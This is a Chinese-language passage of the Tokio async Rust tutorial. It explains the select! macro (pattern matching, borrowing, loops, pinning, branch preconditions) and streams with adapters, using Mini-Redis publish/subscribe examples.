<p>使用 <code>?</code> 操作符从表达式传播错误。它如何工作取决于 <code>?</code> 是从异步表达式还是从 handler 使用。在异步表达式中使用 <code>?</code> 把错误从异步表达式中传播出去，这会使这个异步表达式的输出变成 <code>Result</code> 。在 handler 中使用 <code>?</code> 会立即将错误传播到 <code>select!</code> 表达式外部。让我们再来看看这个 accpet loop ：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::net::TcpListener;
use tokio::sync::oneshot;
use std::io;

#[tokio::main]
async fn main() -&gt; io::Result&lt;()&gt; {
    // [setup `rx` oneshot channel]

    let listener = TcpListener::bind(&quot;localhost:3465&quot;).await?;

    tokio::select! {
        res = async {
            loop {
                let (socket, _) = listener.accept().await?;
                tokio::spawn(async move { process(socket) });
            }

            // Help the rust type inferencer out
            Ok::&lt;_, io::Error&gt;(())
        } =&gt; {
            res?;
        }
        _ = rx =&gt; {
            println!(&quot;terminating accept loop&quot;);
        }
    }

    Ok(())
}
</code></pre></pre>
<p>请关注 <code>listener.accept().await?</code> 。这个 <code>?</code> 操作符把错误传播出了 <code>&lt;async expression&gt;</code> 并且绑定到了 <code>res</code> 。发生错误时 <code>res</code> 会被设置成 <code>Err(_)</code> ，然后在 handler 中，<code>?</code> 操作符再次被使用，<code>res?</code> 语句会把错误传播出 <code>main</code> 函数。</p>
<h2 id="pattern-matching"><a class="header" href="#pattern-matching">Pattern matching</a></h2>
<p>回顾一下 <code>select!</code> 宏的分支语法定义：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>&lt;pattern&gt; = &lt;async expression&gt; =&gt; &lt;handler&gt;,
<span class="boring">}
</span></code></pre></pre>
<p>目前为止，我们仅仅在 <code>&lt;pattern&gt;</code> 上使用了变量绑定。然而，任何 Rust 模式都可以被使用，举个例子，如果说我们从多个 MPSC channels 接收，我们可能会这么做：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::mpsc;

#[tokio::main]
async fn main() {
    let (mut tx1, mut rx1) = mpsc::channel(128);
    let (mut tx2, mut rx2) = mpsc::channel(128);

    tokio::spawn(async move {
        // Do something w/ `tx1` and `tx2`
    });

    tokio::select! {
        Some(v) = rx1.recv() =&gt; {
            println!(&quot;Got {:?} from rx1&quot;, v);
        }
        Some(v) = rx2.recv() =&gt; {
            println!(&quot;Got {:?} from rx2&quot;, v);
        }
        else =&gt; {
            println!(&quot;Both channels closed&quot;);
        }
    }
}
</code></pre></pre>
<p>在这个例子中， <code>select!</code> 表达式等待从 <code>rx1</code> 和 <code>rx2</code> 接收一个 value 。如果一个 channel 关闭了，<code>recv()</code> 会返回 <code>None</code> ，这将<strong>无法</strong>匹配例子中的模式，并且当前分支会被禁用。这个 <code>select!</code> 表达式将会继续在剩余的分支上 wait 。</p>
<p>请注意例子中的 <code>select!</code> 表达式包含一个 <code>else</code> 分支。这个 <code>select!</code> 表达式必须计算出一个 value，当使用模式匹配，可能<strong>没有</strong>一条分支能成功匹配它们所关联的模式，如果这种情况发生了， <code>else</code> 分支就会被计算。</p>
<h2 id="borrowing"><a class="header" href="#borrowing">Borrowing</a></h2>
<p>当生成任务时，生成的异步表达式必须拥有它里面的数据的所有权。但是 <code>select!</code> 宏没有这个限制，每条分支的异步表达式可能是<strong>借用</strong>的数据并且进行并发操作。遵循 Rust  的借用规则，多个异步表达式可以一起<strong>不可变借用</strong>单个数据或者单个异步表达式可以<strong>可变借用</strong>单个数据。</p>
<p>让我们看一下几个例子。这里，我们同时发送相同的数据到两个不同的 TCP 目标。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use tokio::io::AsyncWriteExt;
use tokio::net::TcpStream;
use std::io;
use std::net::SocketAddr;

async fn race(
    data: &amp;[u8],
    addr1: SocketAddr,
    addr2: SocketAddr
) -&gt; io::Result&lt;()&gt; {
    tokio::select! {
        Ok(_) = async {
            let mut socket = TcpStream::connect(addr1).await?;
            socket.write_all(data).await?;
            Ok::&lt;_, io::Error&gt;(())
        } =&gt; {}
        Ok(_) = async {
            let mut socket = TcpStream::connect(addr2).await?;
            socket.write_all(data).await?;
            Ok::&lt;_, io::Error&gt;(())
        } =&gt; {}
        else =&gt; {}
    };

    Ok(())
}
<span class="boring">}
</span></code></pre></pre>
<p>这里的 <code>data</code> 变量是被下面的两个异步表达式<strong>不可变借用</strong>的。当其中一个操作成功完成，另一个将会被 drop。因为我们使用 <code>Ok(_)</code> 来模式匹配，如果一个表达式失败了，另一个会继续执行。</p>
<p>当来到每条分支的 <code>&lt;handler&gt;</code> ，<code>select!</code> 保证只有单个 <code>&lt;handler&gt;</code> 会运行。正因如此，每个 <code>&lt;handler&gt;</code> 可以<strong>不可变借用</strong>相同的数据。</p>
<p>下面这个例子在两个 handler 中都对 <code>out</code> 进行了修改：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::oneshot;

#[tokio::main]
async fn main() {
    let (tx1, rx1) = oneshot::channel();
    let (tx2, rx2) = oneshot::channel();

    let mut out = String::new();

    tokio::spawn(async move {
        // Send values on `tx1` and `tx2`.
    });

    tokio::select! {
        _ = rx1 =&gt; {
            out.push_str(&quot;rx1 completed&quot;);
        }
        _ = rx2 =&gt; {
            out.push_str(&quot;rx2 completed&quot;);
        }
    }

    println!(&quot;{}&quot;, out);
}
</code></pre></pre>
<h2 id="loops"><a class="header" href="#loops">Loops</a></h2>
<p><code>select!</code> 宏经常被用在循环中。这一部分将会通过几个示例来展示在循环中使用 <code>select!</code> 宏的常见方式。我们通过 select 多个 channels 开始：</p>
<pre><pre class="playground"><code class="language-rust">use tokio::sync::mpsc;

#[tokio::main]
async fn main() {
    let (tx1, mut rx1) = mpsc::channel(128);
    let (tx2, mut rx2) = mpsc::channel(128);
    let (tx3, mut rx3) = mpsc::channel(128);

    loop {
        let msg = tokio::select! {
            Some(msg) = rx1.recv() =&gt; msg,
            Some(msg) = rx2.recv() =&gt; msg,
            Some(msg) = rx3.recv() =&gt; msg,
            else =&gt; { break }
        };

        println!(&quot;Got {:?}&quot;, msg);
    }

    println!(&quot;All channels have been closed.&quot;);
}
</code></pre></pre>
<p>这个例子在三个 channel 的 rx 上select。当从任意一个 channel 中接收到一条消息，会将其打印到 STDOUT 。当有一条 channel close 了， <code>recv()</code> 会返回 <code>None</code> ，通过使用模式匹配，<code>select!</code> 宏会继续在剩余的 channels 上等待。当所有的 channel 都 close 了，这里的 <code>else</code> 分支会被计算，并且循环会终止。</p>
<p><code>select!</code> 宏随机选中分支来先检查一下是否就绪。当多个 channel 挂起了它们的 value，一个随机的 channel 会被选中，并从它上面接收值。这是为了处理 receive loop 处理消息的速度比消息被推进 channel 的速度慢的情况，意味着 channel 开始被填满了。如果 <code>select!</code> <strong>没有</strong>随机选中一个分支来第一个检查，那么每次循环在迭代的时候， <code>rx1</code> 都会被第一个检查，如果 <code>rx1</code> 总是持有新消息，那么剩余的 channel 永远都不会被检查。</p>
<blockquote>
<p>如果当 <code>select!</code> 被计算时，多个 channel 都有挂起的值，只有一个 channel 能有值被 pop 出去。所有其它的 channel 保持未被接触（没轮到它们），并且它们的消息会留在 channel 中直到下一次循环迭代。不会有消息丢失。</p>
</blockquote>
<h3 id="resuming-an-async-operation恢复异步操作"><a class="header" href="#resuming-an-async-operation恢复异步操作">Resuming an async operation（恢复异步操作）</a></h3>
<p>现在我们将会展示如何跨多个 <code>select!</code> 调用运行异步操作。在这个例子中，我们有一个 消息类型是 <code>i32</code> 的 MPSC channel ，还有一个异步函数。我们希望运行这个异步函数直到它完成或者一个偶数从 channel 中被接收。</p>
<pre><pre class="playground"><code class="language-rust">async fn action() {
    // Some asynchronous logic
}

#[tokio::main]
async fn main() {
    let (mut tx, mut rx) = tokio::sync::mpsc::channel(128);    

    let operation = action();
    tokio::pin!(operation);

    loop {
        tokio::select! {
            _ = &amp;mut operation =&gt; break,
            Some(v) = rx.recv() =&gt; {
                if v % 2 == 0 {
                    break;
                }
            }
        }
    }
}
</code></pre></pre>
<p>请注意，与在 <code>select!</code> 宏内调用 <code>action()</code> 不同，它在循环<strong>外部</strong>被调用。<code>action()</code> 的返回值被分配到了 <code>operation</code> 且<strong>没有</strong>调用 <code>.await</code> 。然后我们对 <code>operation</code> 调用了 <code>tokio::pin!</code> 。</p>
<p>在 <code>select!</code> 循环内，与传入 <code>operation</code> 不同，我们传入了 <code>&amp;mut operation</code> 。这个 <code>operation</code> 变量正在跟踪执行中的异步操作。每次循环迭代使用这个相同的 operation 而不是来一次新的 <code>action()</code> 调用。</p>
<p><code>select!</code> 的另一个分支从 channel 接收消息，如果消息是一个偶数，我们就结束循环。否则，再次开始 <code>select!</code> </p>
<p>这是我们第一次使用 <code>tokio::pin!</code> ，我们还没打算深挖这它的细节。只需要注意，对一个引用进行 <code>.await</code> 调用，这个被引用的值必须被 pin 或者实现了 <code>Unpin</code> 。</p>
<p>如果我们移除 <code>tokio::pin!</code> 这一行，并且尝试编译，我们会得到以下错误：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>error[E0599]: no method named `poll` found for struct
     `std::pin::Pin&lt;&amp;mut &amp;mut impl std::future::Future&gt;`
     in the current scope
  --&gt; src/main.rs:16:9
   |
16 | /         tokio::select! {
17 | |             _ = &amp;mut operation =&gt; break,
18 | |             Some(v) = rx.recv() =&gt; {
19 | |                 if v % 2 == 0 {
...  |
22 | |             }
23 | |         }
   | |_________^ method not found in
   |             `std::pin::Pin&lt;&amp;mut &amp;mut impl std::future::Future&gt;`
   |
   = note: the method `poll` exists but the following trait bounds
            were not satisfied:
           `impl std::future::Future: std::marker::Unpin`
           which is required by
           `&amp;mut impl std::future::Future: std::future::Future`
<span class="boring">}
</span></code></pre></pre>
<p>尽管我们已经在 <a href="https://m4n5ter.github.io/rust/mini-redis/async_in_depth.html">Async in depth</a> 了解了 <code>Future</code> ，但是这个错误对我们来说仍然不是很清晰。如果你在尝试对一个<strong>reference</strong> 调用 <code>.await</code> 时碰到了这样的一个关于 &quot; <code>Future</code> 没有实现... &quot; 的错误，那么这个 future 可能需要被 pin 。</p>
<p>从 <a href="https://doc.rust-lang.org/std/pin/index.html">standard library</a> 阅读更多关于 <a href="https://doc.rust-lang.org/std/pin/index.html"><code>Pin</code></a> 的细节。</p>
<h3 id="modifying-a-branch"><a class="header" href="#modifying-a-branch">Modifying a branch</a></h3>
<p>让我们看一个稍微复杂一些的 loop。我们有：</p>
<ol>
<li>
<p>一个内容是 <code>i32</code> 的 channel。</p>
</li>
<li>
<p>一个对 <code>i32</code> 执行的异步操作。</p>
</li>
</ol>
<p>我们想要实现的逻辑是：</p>
<ol>
<li>
<p>在 channel 上等待一个<strong>偶数</strong></p>
</li>
<li>
<p>使用这个偶数作为输入来开始一个异步操作。</p>
</li>
<li>
<p>等待这个异步操作，但是同时要从 channel 监听更多的偶数。</p>
</li>
<li>
<p>如果一个新的偶数在已经存在的异步操作完成之前被接收到了，退出存在的异步操作并且用新的偶数再跑一个。</p>
</li>
</ol>
<pre><pre class="playground"><code class="language-rust">async fn action(input: Option&lt;i32&gt;) -&gt; Option&lt;String&gt; {
    // If the input is `None`, return `None`.
    // This could also be written as `let i = input?;`
    let i = match input {
        Some(input) =&gt; input,
        None =&gt; return None,
    };
    // async logic here
}

#[tokio::main]
async fn main() {
    let (mut tx, mut rx) = tokio::sync::mpsc::channel(128);

    let mut done = false;
    let operation = action(None);
    tokio::pin!(operation);

    tokio::spawn(async move {
        let _ = tx.send(1).await;
        let _ = tx.send(3).await;
        let _ = tx.send(2).await;
    });

    loop {
        tokio::select! {
            res = &amp;mut operation, if !done =&gt; {
                done = true;

                if let Some(v) = res {
                    println!(&quot;GOT = {}&quot;, v);
                    return;
                }
            }
            Some(v) = rx.recv() =&gt; {
                if v % 2 == 0 {
                    // `.set` is a method on `Pin`.
                    operation.set(action(Some(v)));
                    done = false;
                }
            }
        }
    }
}
</code></pre></pre>
<p>我们使用了和之前那个例子相似的方法。这个异步函数在循环外被调用，并且分配到 <code>operation</code> 。这个 <code>operation</code> 变量被 pin 了。这个循环会在 <code>operation</code> 和 channel receiver 上 select 。</p>
<p>请注意 <code>action</code> 是如何携带 <code>Option&lt;i32&gt;</code> 作为一个参数的。在我们接收到第一个偶数之前，我们需要实例化一个 <code>operation</code> 。我们使 <code>action</code> 携带 <code>Option</code> 并且返回 <code>Option</code> 。如果 <code>None</code> 被传递进去了，会返回  <code>None</code> 。第一次循环迭代， <code>operation</code> 会立即完成并返回 <code>None</code> （因为我们实例化它的时候穿的是 <code>None</code>）。</p>
<p>这个例子使用了一些新语法。这第一个分支包括 <code>,if !done</code> ，这是一个分支先决条件。在解释它是如何工作的之前，让我们看下如果省略这个先决条件会发生什么。移除 <code>,if !done</code> 并且运行例子会导致以下输出：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>thread 'main' panicked at '`async fn` resumed after completion', src/main.rs:1:55
note: run with `RUST_BACKTRACE=1` environment variable to display a backtrace
<span class="boring">}
</span></code></pre></pre>
<p>当尝试在 <code>operation</code> 已经完成<strong>之后</strong>使用它时，这个错误发生了。一般来说，当使用 <code>.await</code> ，这个被 await 的值就被消费掉了。在这个例子中，我们 await 了一个引用，这意味着 <code>operation</code> 在它完成后仍然存在。</p>
<p>为了避免这个 panic，如果 <code>operation</code> 已经完成，我们必须小心地禁用第一条分支。这里的 <code>done</code> 变量被用来跟踪 <code>operation</code> 是否完成。一个 <code>select!</code> 分支可能会包含一个 <strong>precondition</strong> （先决条件），这个先决条件会在 <code>select!</code> await 当前分支<strong>之前</strong>被检查（虽然顺序上它被写在后面，但是不影响它是一个 &quot;先决条件&quot;）。如果先决条件计算出了 <code>false</code> 那么该分支会被禁用。<code>done</code> 变量被初始化为 <code>false</code> 。当 <code>operation</code> 完成，<code>done</code> 会被设置为 <code>true</code> ，这样在下次循环迭代的时候将会禁用 <code>operation</code> 分支。当一个偶数消息从 channel 被接收，<code>operation</code> 会被重置，并且 <code>done</code> 会被设置为 <code>false</code> 。</p>
<h2 id="per-task-concurrency"><a class="header" href="#per-task-concurrency">Per-task concurrency</a></h2>
<p><code>tokio::spawn</code> 和 <code>select!</code> 都能够运行并发的异步操作。然而，运行并发操作的策略有所不同。<code>tokio::spawn</code> 函数携带一个异步操作，并且生成一个新的任务去运行它。一个任务是 Tokio runtime 调度的对象。两个不同的任务会被 Tokio 独立调度，它们可能会同时运行在不同的操作系统线程上。正因如此，一个被生成的任务和被生成的线程具有相同的限制：不能有借用！</p>
<p><code>select!</code> 宏会在<strong>同一个任务</strong>中并发运行所有的分支。因为所有的 <code>select!</code> 分支都在同一个任务中被执行，它们永远不可能<strong>同时</strong>被运行。<code>select!</code> 宏会在单个任务上多路复用异步操作。</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="streams"><a class="header" href="#streams">Streams</a></h2>
<p>stream 是一种异步的一系列的值。它的异步等效与 Rust 的 <a href="https://doc.rust-lang.org/book/ch13-02-iterators.html"><code>std::iter::Iterator</code></a> 并且通过 <a href="https://docs.rs/futures-core/0.3/futures_core/stream/trait.Stream.html"><code>Stream</code></a> trait 来表示。Streams 能够在 <code>async</code> functions 中被迭代。它们也可以通过适配器被转换。Tokio 在 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html"><code>StreamExt</code></a> trait 上提供了一些场景的适配器。</p>
<p>Tokio 在一个单独的 crate 提供了 stream 支持：<code>tokio-stream</code> 。</p>
<pre><code class="language-toml">tokio-stream = &quot;0.1&quot;
</code></pre>
<blockquote>
<p>目前，Tokio 的 stream 实用工具存在与 <code>tokio-strean</code> crate 中。一旦 <code>Stream</code> trait 在 Rust 标准库中稳定了，Tokio 的 stream 将会被移动到 <code>tokio</code> crate 。</p>
</blockquote>
<h2 id="iteration"><a class="header" href="#iteration">Iteration</a></h2>
<p>目前为止，Rust 编程语言没有支持异步的 <code>for</code> 循环。作为替代，迭代 stream 通过使用  <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.next"><code>StreamExt::next()</code></a> 并配对一个 <code>while let</code> 循环来完成。</p>
<pre><pre class="playground"><code class="language-rust">use tokio_stream::StreamExt;

#[tokio::main]
async fn main() {
    let mut stream = tokio_stream::iter(&amp;[1, 2, 3]);

    while let Some(v) = stream.next().await {
        println!(&quot;GOT = {:?}&quot;, v);
    }
}
</code></pre></pre>
<p>像迭代器一样，<code>next()</code> 方法返回 <code>Option&lt;T&gt;</code> ，T 是 stream 里的值的类型。接收到 <code>None</code> 表示这个 stream iteration 终止了。</p>
<h3 id="mini-redis-broadcast-mini-redis-广播"><a class="header" href="#mini-redis-broadcast-mini-redis-广播">Mini-Redis broadcast （Mini-Redis 广播）</a></h3>
<p>让我们使用 Mini-Redis client 来回顾一个稍微更复杂的例子。</p>
<p>完整的代码可以在<a href="https://github.com/tokio-rs/website/blob/master/tutorial-code/streams/src/main.rs">这里</a>找到。</p>
<pre><pre class="playground"><code class="language-rust">use tokio_stream::StreamExt;
use mini_redis::client;

async fn publish() -&gt; mini_redis::Result&lt;()&gt; {
    let mut client = client::connect(&quot;127.0.0.1:6379&quot;).await?;

    // Publish some data
    client.publish(&quot;numbers&quot;, &quot;1&quot;.into()).await?;
    client.publish(&quot;numbers&quot;, &quot;two&quot;.into()).await?;
    client.publish(&quot;numbers&quot;, &quot;3&quot;.into()).await?;
    client.publish(&quot;numbers&quot;, &quot;four&quot;.into()).await?;
    client.publish(&quot;numbers&quot;, &quot;five&quot;.into()).await?;
    client.publish(&quot;numbers&quot;, &quot;6&quot;.into()).await?;
    Ok(())
}

async fn subscribe() -&gt; mini_redis::Result&lt;()&gt; {
    let client = client::connect(&quot;127.0.0.1:6379&quot;).await?;
    let subscriber = client.subscribe(vec![&quot;numbers&quot;.to_string()]).await?;
    let messages = subscriber.into_stream();

    tokio::pin!(messages);

    while let Some(msg) = messages.next().await {
        println!(&quot;got = {:?}&quot;, msg);
    }

    Ok(())
}

#[tokio::main]
async fn main() -&gt; mini_redis::Result&lt;()&gt; {
    tokio::spawn(async {
        publish().await
    });

    subscribe().await?;

    println!(&quot;DONE&quot;);

    Ok(())
}
</code></pre></pre>
<p>一个任务被生成来发布消息到 Mini-Redis server 上的 &quot;numbers&quot; channel 。然后，在主要的任务中，我们订阅 &quot;numbers&quot; channel 并且打印接收到的消息。</p>
<p>订阅之后，我们在返回的 subscriber 上调用 <a href="https://docs.rs/mini-redis/0.4/mini_redis/client/struct.Subscriber.html#method.into_stream"><code>into_stream()</code></a> 。这个方法会消费掉这个 <code>Subscriber</code> ，返回一个能在消息到达的时候生成消息的 stream 。在我们开始迭代消息之前，注意这个 stream 通过<a href="https://docs.rs/tokio/1/tokio/macro.pin.html"><code>tokio::pin!</code></a> 被  <a href="https://doc.rust-lang.org/std/pin/index.html">pin</a> 到了栈上。 在一个 stream 上调用 <code>next()</code> 要求这个 stream 是 <a href="https://doc.rust-lang.org/std/pin/index.html">pinned</a> （这也是上面用 <code>tokio::pin!</code> 的原因）。<code>into_stream()</code> 函数返回一个没有被 pin 的 stream，为了迭代这个 stream ，我们必须显式地 pin 它。</p>
<blockquote>
<p>当一个 Rust 的值不再能够在内存中被移动时，这个值就是 &quot;pinned&quot; 。a pinned value 的关键属性是指针可以取到 pinned data 并且调用者可以确信指针是有效的。这个特性被 <code>async/await</code> 用来支持跨 <code>.await</code> 点的借用数据。</p>
</blockquote>
<p>如果我们忘记 pin the stream，我们会得到一个像这样的错误：</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>error[E0277]: `from_generator::GenFuture&lt;[static generator@Subscriber::into_stream::{closure#0} for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6&gt; {ResumeTy, &amp;'r mut Subscriber, Subscriber, impl Future, (), std::result::Result&lt;Option&lt;Message&gt;, Box&lt;(dyn std::error::Error + Send + Sync + 't0)&gt;&gt;, Box&lt;(dyn std::error::Error + Send + Sync + 't1)&gt;, &amp;'t2 mut async_stream::yielder::Sender&lt;std::result::Result&lt;Message, Box&lt;(dyn std::error::Error + Send + Sync + 't3)&gt;&gt;&gt;, async_stream::yielder::Sender&lt;std::result::Result&lt;Message, Box&lt;(dyn std::error::Error + Send + Sync + 't4)&gt;&gt;&gt;, std::result::Result&lt;Message, Box&lt;(dyn std::error::Error + Send + Sync + 't5)&gt;&gt;, impl Future, Option&lt;Message&gt;, Message}]&gt;` cannot be unpinned
  --&gt; streams/src/main.rs:29:36
   |
29 |     while let Some(msg) = messages.next().await {
   |                                    ^^^^ within `tokio_stream::filter::_::__Origin&lt;'_, impl Stream, [closure@streams/src/main.rs:22:17: 25:10]&gt;`, the trait `Unpin` is not implemented for `from_generator::GenFuture&lt;[static generator@Subscriber::into_stream::{closure#0} for&lt;'r, 's, 't0, 't1, 't2, 't3, 't4, 't5, 't6&gt; {ResumeTy, &amp;'r mut Subscriber, Subscriber, impl Future, (), std::result::Result&lt;Option&lt;Message&gt;, Box&lt;(dyn std::error::Error + Send + Sync + 't0)&gt;&gt;, Box&lt;(dyn std::error::Error + Send + Sync + 't1)&gt;, &amp;'t2 mut async_stream::yielder::Sender&lt;std::result::Result&lt;Message, Box&lt;(dyn std::error::Error + Send + Sync + 't3)&gt;&gt;&gt;, async_stream::yielder::Sender&lt;std::result::Result&lt;Message, Box&lt;(dyn std::error::Error + Send + Sync + 't4)&gt;&gt;&gt;, std::result::Result&lt;Message, Box&lt;(dyn std::error::Error + Send + Sync + 't5)&gt;&gt;, impl Future, Option&lt;Message&gt;, Message}]&gt;`
   |
   = note: required because it appears within the type `impl Future`
   = note: required because it appears within the type `async_stream::async_stream::AsyncStream&lt;std::result::Result&lt;Message, Box&lt;(dyn std::error::Error + Send + Sync + 'static)&gt;&gt;, impl Future&gt;`
   = note: required because it appears within the type `impl Stream`
   = note: required because it appears within the type `tokio_stream::filter::_::__Origin&lt;'_, impl Stream, [closure@streams/src/main.rs:22:17: 25:10]&gt;`
   = note: required because of the requirements on the impl of `Unpin` for `tokio_stream::filter::Filter&lt;impl Stream, [closure@streams/src/main.rs:22:17: 25:10]&gt;`
   = note: required because it appears within the type `tokio_stream::map::_::__Origin&lt;'_, tokio_stream::filter::Filter&lt;impl Stream, [closure@streams/src/main.rs:22:17: 25:10]&gt;, [closure@streams/src/main.rs:26:14: 26:40]&gt;`
   = note: required because of the requirements on the impl of `Unpin` for `tokio_stream::map::Map&lt;tokio_stream::filter::Filter&lt;impl Stream, [closure@streams/src/main.rs:22:17: 25:10]&gt;, [closure@streams/src/main.rs:26:14: 26:40]&gt;`
   = note: required because it appears within the type `tokio_stream::take::_::__Origin&lt;'_, tokio_stream::map::Map&lt;tokio_stream::filter::Filter&lt;impl Stream, [closure@streams/src/main.rs:22:17: 25:10]&gt;, [closure@streams/src/main.rs:26:14: 26:40]&gt;&gt;`
   = note: required because of the requirements on the impl of `Unpin` for `tokio_stream::take::Take&lt;tokio_stream::map::Map&lt;tokio_stream::filter::Filter&lt;impl Stream, [closure@streams/src/main.rs:22:17: 25:10]&gt;, [closure@streams/src/main.rs:26:14: 26:40]&gt;&gt;`
<span class="boring">}
</span></code></pre></pre>
<p>如果你遇到了类似这样的错误信息，请尝试 pin 这个值！！！</p>
<p>在尝试运行这个之前，先把 Mini-Redis server 跑起来：</p>
<pre><code class="language-zsh">mini-redis-server
</code></pre>
<p>然后尝试运行上面的代码。我们将会看到消息被输出到了 STDOUT。</p>
<pre><code class="language-textile">got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;1&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;two&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;3&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;four&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;five&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;6&quot; })
</code></pre>
<p>由于订阅和发布之间存在竞争，一些早期消息可能会被删除。该程序永远不会退出。只要服务器处于活动状态，对 Mini-Redis 频道的订阅就会保持活动状态。</p>
<p>让我们看看可以怎么来用 stream 拓展这个程序。</p>
<h2 id="adapters-适配器"><a class="header" href="#adapters-适配器">Adapters （适配器）</a></h2>
<p>接收一个 <a href="https://docs.rs/futures-core/0.3/futures_core/stream/trait.Stream.html"><code>Stream</code></a> 并且返回另一个 <a href="https://docs.rs/futures-core/0.3/futures_core/stream/trait.Stream.html"><code>Stream</code></a> 的函数通常被称为 'stream adapters' ，因为它们是 'adapter pattern' 的一种形式。常见的 stream adapters 包括 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.map"><code>map</code></a>、 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.take"><code>take</code></a> 和 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.filter"><code>filter</code></a> 。</p>
<p>让我们更新一下 Mini-Redis 来让它能够退出。在接收到 3 个消息后，停止迭代消息，使用 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.take"><code>take</code></a> 来完成这个目的。这个 adapter 限制 stream 生产<strong>至多</strong> <code>n</code> 条消息（n 条消息后 <code>while let</code> 就拿不到 <code>Some</code> 了，程序就能退出了）。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let messages = subscriber
    .into_stream()
    .take(3);
<span class="boring">}
</span></code></pre></pre>
<p>再次运行程序，我们得到了：</p>
<pre><code class="language-textile">got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;1&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;two&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;3&quot; })
</code></pre>
<p>这次程序结束了。</p>
<p>现在，让我们把 stream 限制为个位数，我们将会通过检查消息的长度来确保此事。我们使用 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.filter"><code>filter</code></a> adapter 来 drop 任何不匹配先决条件的消息。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let messages = subscriber
    .into_stream()
    .filter(|msg| match msg {
        Ok(msg) if msg.content.len() == 1 =&gt; true,
        _ =&gt; false,
    })
    .take(3);
<span class="boring">}
</span></code></pre></pre>
<p>再次运行程序，我们得到：</p>
<pre><code class="language-textile">got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;1&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;3&quot; })
got = Ok(Message { channel: &quot;numbers&quot;, content: b&quot;6&quot; })
</code></pre>
<p>请注意，adapter 的应用顺序很重要。先调用 <code>filter</code> 然后 <code>take</code> 是跟先 <code>take</code> 然后 <code>filter</code> 不一样的（这很好理解，先 <code>take</code> 的话，就会在前三个里找内容是个位数的消息）。</p>
<p>最后，我们将通过剥离 <code>Ok(Message{...})</code> 部分来整理输出，这通过 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.map"><code>map</code></a> 来完成。因为这是在 <code>filter</code> 之后被应用的，我们能知道消息是 <code>Ok</code>，所以我们可以使用 <code>unwrap()</code> 。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>let messages = subscriber
    .into_stream()
    .filter(|msg| match msg {
        Ok(msg) if msg.content.len() == 1 =&gt; true,
        _ =&gt; false,
    })
    .map(|msg| msg.unwrap().content)
    .take(3);
<span class="boring">}
</span></code></pre></pre>
<p>现在，输出是：</p>
<pre><code class="language-textile">got = b&quot;1&quot;
got = b&quot;3&quot;
got = b&quot;6&quot;
</code></pre>
<p>另一种选择是使用 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.filter_map"><code>filter_map</code></a> 将 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.filter"><code>filter</code></a> 和 <a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html#method.map"><code>map</code></a> 两个步骤组合起来作为一个单次调用。</p>
<p>在<a href="https://docs.rs/tokio-stream/0.1/tokio_stream/trait.StreamExt.html">这里</a>可以找到更多可用的 adapter。</p>
<h2 id="implementing-stream"><a class="header" href="#implementing-stream">Implementing <code>Stream</code></a></h2>
<p> <a href="https://docs.rs/futures-core/0.3/futures_core/stream/trait.Stream.html"><code>Stream</code></a> trait 和 <a href="https://doc.rust-lang.org/std/future/trait.Future.html"><code>Future</code></a> trait 非常类似。</p>
<pre><pre class="playground"><code class="language-rust"><span class="boring">#![allow(unused)]
</span><span class="boring">fn main() {
</span>use std::pin::Pin;
use std::task::{Context, Poll};

pub trait Stream {
    type Item;

    fn poll_next(
        self: Pin&lt;&amp;mut Self&gt;, 
        cx: &amp;mut Context&lt;'_&gt;
    ) -&gt; Poll&lt;Option&lt;Self::Item&gt;&gt;;

    fn size_hint(&amp;self) -&gt; (usize, Option&lt;usize&gt;) {
        (0, None)
    }
}
<span class="boring">}
</span></code></pre></pre>
<p><code>Stream::poll_next()</code> 函数非常像 <code>Future::poll</code> ，除了它可以被反复调用来从 stream 接收许多值。正如我们在<a href="https://m4n5ter.github.io/rust/mini-redis/async_in_depth.html">Async in depth</a>了解到的一样，当一个 stream <strong>没有</strong>准备好返回一个值的时候，<code>Poll::Pending</code> 会被返回。任务的 waker 会被注册，一旦 stream 应该被再次 poll 的时候，waker 会被通知。</p>
